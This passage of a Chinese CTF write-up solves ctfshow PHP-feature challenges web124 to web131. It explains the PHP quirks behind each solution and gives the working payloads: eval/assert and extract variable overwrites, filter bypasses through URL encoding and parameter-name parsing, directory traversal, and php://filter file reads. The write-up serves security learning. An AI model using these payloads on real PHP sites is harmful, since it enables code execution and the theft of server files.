<li>变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _）。</li>
</ul>
<p>我们需要明白一下PHP的字符串解析</p>
<h4 id="PHP的字符串解析特性bypass"><a href="#PHP的字符串解析特性bypass" class="headerlink" title="PHP的字符串解析特性bypass"></a>PHP的字符串解析特性bypass</h4><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST时，查询字符串在解析的过程中会将某些字符删除或用下划线代替</p>
<p><strong>在 PHP 8 之前 的版本中，当参数名中含有 .（点号）或者<code>[</code>(下划线)时，会被自动转为 <code>_</code>（下划线）。如果<code>[</code>出现在参数中使得错误转换导致接下来如果该参数名中还有非法字符并不会继续转换成下划线<code>_</code>，但是如果参数最后出现了<code>]</code>,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组</strong></p>
<h3 id="解法二-通过eval赋值给fl0g拿到flag"><a href="#解法二-通过eval赋值给fl0g拿到flag" class="headerlink" title="解法二:通过eval赋值给fl0g拿到flag"></a>解法二:通过eval赋值给fl0g拿到flag</h3><p>payload1:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 是 PHP 中一个包含当前请求 URL 查询字符串的超全局变量。查询字符串是 URL 中问号（<code>?</code>）后面的部分，通常用于传递参数给服务器。当我们通过get传入fl0g的时候，$a[0]&#x3D; $_SERVER[‘QUERY_STRING’]&#x3D;($fl0g&#x3D;flag_give_me);assert 函数用于执行字符串中的 PHP 代码，实现变量覆盖。</p>
<p>payload2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>知识点:</p>
<p>利用parse_str()将字符串解析成多个变量+隔断argv</p>
<p>本地测试:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<img src="./../image/achieve/202411/php特性---ctfshow/73a60425890c8f915c96a6b17911a449.png" alt="img" style="zoom: 80%;" />

<p>可以用加号+进行分隔，从而使得$_SERVER[‘argv’]这个array不仅仅只有[0]。</p>
<p>大佬的总结说：</p>
<p>CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去</p>
<p>继续判断query string是否为空，</p>
<p>如果不为空把通过+符号分割的字符串转换成php内部的zend_string，</p>
<p>然后再把这个zend_string复制到 arr 数组中去。</p>
<p>这样就可以通过加号+分割argv成多个部分，正如我们上面测试的结果</p>
<p>简单来说就是通过+分割argv的结果，使得我们可以利用数组的调用去进行传参绕过验证</p>
<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>真狠啊把一堆关键词都过滤了</p>
<p>找找看哪个输出函数是可以用的上的</p>
<p>payload:</p>
<p><code>POST:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>
<h3 id="extract-array-用法"><a href="#extract-array-用法" class="headerlink" title="extract($array)用法"></a>extract($array)用法</h3><p><code>extract($_POST)</code> 是将 <code>$_POST</code> 超全局变量中的键值对解压缩为对应的变量和值。</p>
<p><code>extract($array)</code>： 从数组中将变量导入到当前的符号表。可以实现变量覆盖。</p>
<p>或者可以用highlight_file</p>
<p><code>GET:?1=flag.php </code><br><code>POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>
<p>或者可以用上一题第二种解法</p>
<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法和前面的是一样的，没什么大变化</p>
<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><h3 id="绕过-SERVER-‘QUERY-STRING’"><a href="#绕过-SERVER-‘QUERY-STRING’" class="headerlink" title="#绕过$_SERVER[‘QUERY_STRING’]"></a>#绕过$_SERVER[‘QUERY_STRING’]</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是得绕过$url &#x3D; $_SERVER[‘QUERY_STRING’];</p>
<p>payload1:</p>
<p>因为$_SERVER[‘QUERY_STRING’]是用于获取查询语句(即?号之后的参数)的</p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取的查询语句是服务端还没url解码的，所以url编码绕过即可&#96;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf%5fshow=ilove36d</span><br></pre></td></tr></table></figure>

<p>payload2</p>
<p>题目检查的是query_string而不是$<em>GET<br>因此可以利用不合法的变量名，让其自动替换成&#96;</em></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span><span class="symbol">:<span class="string">?c</span>tf%</span>20show=ilove36d</span><br></pre></td></tr></table></figure>

<p>我们来看看哪些不合法的字符会被解析成下划线</p>
<h3 id="不合法变量名字符的解析"><a href="#不合法变量名字符的解析" class="headerlink" title="不合法变量名字符的解析"></a>不合法变量名字符的解析</h3><p>在php中，解析字符串变量名的时候，会将一些非法字符转化成下划线，因此我们可以借助这个绕过url获取查询语句的验证</p>
<p>能够被解析成_的ascii为，+(空格) . %5B([) _</p>
<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><h3 id="无数字无字母函数"><a href="#无数字无字母函数" class="headerlink" title="#无数字无字母函数"></a>#无数字无字母函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<h3 id="相关函数-6"><a href="#相关函数-6" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="call-user-func-函数-1"><a href="#call-user-func-函数-1" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h4><p>在 PHP 中，<code>call_user_func()</code> 函数用于调用一个回调函数。这个函数非常灵活，可以用来调用普通的用户定义函数、静态方法、对象方法等</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$parameters</span>)</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li><strong>$callback</strong>: 要调用的函数名或方法（可以是字符串或数组）。</li>
<li><strong>$parameters</strong>: 可变参数，可以传入给回调函数的参数。</li>
</ul>
<p>返回值</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span>` 将返回被调用函数的返回值。如果要调用的函数没有返回值，则返回 `NULL</span><br></pre></td></tr></table></figure>

<p>回到题目</p>
<p>这里对f1进行了字母数字的过滤</p>
<p>对于call_user_func()函数的嵌套，我们可以看到，如果f1是一个可执行的函数，那么这个call_user_func()函数会执行f1函数并传入f2作为参数，但因为外层还有一个call_user_func()函数，所以内部的返回值必须是另一个可调用的函数</p>
<p>搜查资料可以找到一个函数_()，即 gettext()的拓展函数，但是要求php扩展目录下有php_gettext.dll这个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$domain</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">bindtextdomain</span>(<span class="variable">$domain</span>, <span class="string">&quot;locale/&quot;</span>);<span class="comment">//设置某个域的mo文件路径</span></span><br><span class="line"><span class="title function_ invoke__">textdomain</span>(<span class="variable">$domain</span>);<span class="comment">//设置gettext()函数从哪个域去找mo文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;Hi,phper!&quot;</span>);<span class="comment">//_()是gettext()函数的简写形式</span></span><br></pre></td></tr></table></figure>

<p><code>_()</code> 函数在 PHP 中通常用于国际化和本地化的字符串翻译</p>
<p>所以f1设为_就可以绕过验证也能将内置函数的返回值输出出来，所以f2设置为另一个可以读取flag的函数就可以了</p>
<p>这里我们将f2设置为get_defined_vars()函数</p>
<h3 id="get-defined-vars-函数"><a href="#get-defined-vars-函数" class="headerlink" title="get_defined_vars()函数"></a>get_defined_vars()函数</h3><p><code>get_defined_vars()</code> 是 PHP 的一个内置函数，它用于返回当前作用域中所有已定义变量的关联数组,这个函数非常有用，特别是在调试过程中，因为它可以让开发者查看当前作用域内的所有变量及其值。</p>
<p>基础用法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">get_defined_vars</span>(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>

<p>返回值</p>
<p><code>get_defined_vars()</code> 返回一个关联数组，数组的键是变量名，值是对应的变量值。</p>
<p>所以最终的payload是</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Payload</span>：?<span class="built_in">f1</span><span class="symbol">=_</span>&amp;<span class="built_in">f2</span><span class="symbol">=get_defined_vars</span></span><br></pre></td></tr></table></figure>

<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="stripos-函数"><a href="#stripos-函数" class="headerlink" title="stripos()函数"></a>stripos()函数</h3><p><code>stripos()</code> 是 PHP 的一个内置函数，用于在一个字符串中查找另一个字符串的首次出现位置，比较时不区分大小写</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">stripos</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>, <span class="keyword">string</span> <span class="variable">$needle</span>, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>参数</p>
<p><strong>$haystack</strong>: 要搜索的目标字符串。</p>
<p><strong>$needle</strong>: 要查找的子字符串。</p>
<p><strong>$offset</strong>: 可选参数，指定从哪个位置开始搜索。默认值是 0。</p>
<p>返回值</p>
<ul>
<li>如果找到 <code>$needle</code>，则返回 <code>$needle</code> 在 <code>$haystack</code> 中首次出现的位置（以 0 为起始索引）。</li>
<li>如果未找到，返回 <code>FALSE</code>。</li>
</ul>
<h3 id="readfile-函数"><a href="#readfile-函数" class="headerlink" title="readfile()函数"></a>readfile()函数</h3><p><code>readfile()</code> 是 PHP 的一个内置函数，用于读取文件并将其内容发送到输出缓冲区</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">readfile</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>, resource <span class="variable">$context</span> = <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li><strong>$filename</strong>: 要读取的文件的路径（可以是相对路径或绝对路径）。</li>
<li><strong>$use_include_path</strong>: 可选参数，表示是否在包括路径中查找文件。默认为 <code>false</code>。</li>
<li><strong>$context</strong>: 可选参数，指定一个上下文资源，用于修改文件的读取行为（例如，设置流选项）。</li>
</ul>
<p>返回值</p>
<ul>
<li>返回读取的字节数，或者在出错时返回 <code>false</code>。</li>
</ul>
<p>解题</p>
<p>stripos($f, ‘ctfshow’)&gt;0–用于检查字符串 <code>$f</code> 中是否包含子字符串 <code>&#39;ctfshow&#39;</code>，并且这个子字符串第一次出现的位置是否大于 0</p>
<p>因为readfile()函数是输出一个文件，所以我们的f中应该包含一个文件目录</p>
<p>但是因为我们不知道flag在哪层目录里面，所以我们试一下目录穿越</p>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><strong>定义与原理</strong></p>
<ul>
<li>定义：目录穿越是指攻击者通过构造特定的URL或请求，绕过Web应用程序的安全机制，访问或执行服务器上的任意文件或命令。</li>
<li>原理：在文件系统路径中，.. 表示上一级目录。攻击者可以利用这一点，通过构造包含多个 ..&#x2F; 的URL或请求，逐步向上移动目录树，直到能够访问到服务器上的敏感文件或执行受限命令。</li>
</ul>
<p><strong>常见攻击手法</strong></p>
<ul>
<li>URL参数：攻击者可以在URL中插入 ..&#x2F; 序列，尝试访问上级目录中的文件。</li>
<li>文件绝对路径：在某些情况下，攻击者可能会尝试使用文件的绝对路径来直接访问目标文件。</li>
<li>绕过手段：为了绕过Web应用程序的安全检查，攻击者可能会使用URL编码、单次替换（双写）、截断绕过等技巧来构造恶意请求。</li>
</ul>
<p>所以我们构造payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="regexp">/ctfshow/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure>

<p>其中的..&#x2F;..&#x2F;..&#x2F;这是深层目录，根据需要尝试，另外目录是根据之前的题目猜测得到，var&#x2F;www&#x2F;html&#x2F;index.php也有回显</p>
<p>或者也可以直接用包装器进行读取flag</p>
<p>Payload：?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;ctfshow&#x2F;resource&#x3D;flag.php，只要包含了ctfshow且出现位置不为0都可以通过验证</p>
<p>我一开始很疑惑，这里面的ctfshow不会影响这个payload的实现吗，然后我搜寻了一下得到了较为合理的解释</p>
<p>在 PHP 中，<code>php://filter</code> 是一个特殊的流包装器，它用于对数据进行过滤或处理。你提到的 payload <code>?f=php://filter/ctfshow/resource=flag.php</code> 使用了 <code>php://filter</code> 来访问名为 <code>flag.php</code> 的文件，并且遭遇到的 <code>stripos($f, &#39;ctfshow&#39;) &gt; 0</code> 检查实际上不会影响对 <code>flag.php</code> 读取的执行。</p>
<h3 id="要点-PHP对无法使用的filter过滤器只会抛出warning而不是error"><a href="#要点-PHP对无法使用的filter过滤器只会抛出warning而不是error" class="headerlink" title="要点:PHP对无法使用的filter过滤器只会抛出warning而不是error"></a>要点:PHP对无法使用的filter过滤器只会抛出warning而不是error</h3><p>ctfshow过滤器解析</p>
<ol>
<li><p><strong>流包装器的工作原理</strong>：</p>
<ul>
<li><code>php://filter</code> 允许你对资源进行过滤。在这个情况下，<code>php://filter/ctfshow/resource=flag.php</code> 被理解为请求流过滤器 <code>ctfshow</code> 来处理文件 <code>flag.php</code> 的内容。</li>
<li><code>ctfshow</code> 在此处并不是直接影响文件读取的内容，而是作为过滤器存在。</li>
</ul>
</li>
<li><p><strong><code>stripos</code> 检查</strong>：</p>
<ul>
<li>当 <code>stripos($f, &#39;ctfshow&#39;)</code> 被调用时，它会返回 <code>15</code>（<code>ctfshow</code> 在字符串中的起始索引），因为这个字符串是 <code>php://filter/ctfshow/resource=flag.php</code>。这意味着这个条件会为 <code>true</code>，后续代码将继续执行。</li>
<li>这里的 <code>ctfshow</code> 实际上不会干扰读取 <code>flag.php</code>，反而它是被作为处理该文件的一部分。</li>
</ul>
</li>
<li><p><strong>文件读取的过程</strong>：</p>
<ul>
<li>当 PHP 处理这个请求时，它首先识别到 <code>php://filter</code>，然后应用 <code>ctfshow</code> 过滤器。接着，PHP 会读取 <code>flag.php</code> 文件的内容。</li>
<li><code>ctfshow</code> 作为过滤器的作用是对输出进行操作，而不是改变读取的文件内容或路径。</li>
</ul>
<p>说白了就是<strong>PHP对无法使用的filter过滤器只会抛出warning而不是error，还是能正常执行的</strong></p>
</li>
</ol>
<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">very</span> very very（省略<span class="number">25</span>万个very）ctfshow</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="非贪婪模式-？"><a href="#非贪婪模式-？" class="headerlink" title=".+?非贪婪模式(.*？)"></a>.+?非贪婪模式(.*？)</h3><ul>
<li><p><strong>非贪婪模式</strong>：通过在量词后添加 <code>?</code>，使得匹配尽可能少的字符，直到找到第一个满足整个表达式的匹配。</p>
</li>
<li><h3 id="常用的量词与非贪婪模式"><a href="#常用的量词与非贪婪模式" class="headerlink" title="常用的量词与非贪婪模式"></a>常用的量词与非贪婪模式</h3><p>为了使用非贪婪模式，可以在以下量词后添加 <code>?</code>：</p>
<ul>
<li><code>*?</code>：匹配零个或多个字符（非贪婪）。</li>
<li><code>+?</code>：匹配一个或多个字符（非贪婪）。</li>
<li><code>??</code>：匹配零个或一个字符（非贪婪）。</li>
<li><code>&#123;n,m&#125;?</code>：匹配至少 n 个字符，至多 m 个字符（非贪婪）。</li>
</ul>
</li>
<li><p>.+?”表示非贪婪匹配，即前面的字符至少出现一次</p>
</li>
</ul>
<h4 id="s正则匹配"><a href="#s正则匹配" class="headerlink" title="&#x2F;s正则匹配"></a>&#x2F;s正则匹配</h4><ul>
<li>这个修饰符表示点号 <code>.</code> 可以匹配换行符。这意味着在多行文本中，<code>.</code> 也可以匹配换行符后的字符。</li>
</ul>
<p>所以这个正则匹配的意思是，如果ctfshow前面有任意字符，则匹配成功</p>
<p>那我们直接传入ctfshow就可以了，只要前面没有字符的话就能同时满足两个if判断</p>
<p>还有别的方法，我们放在下道题进行深入讲解</p>
<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话一个是得满足ctfshow前面不能有字符，另一个是需要ctfshow前面有36D字符串，这种情况下只能用新的方法了</p>
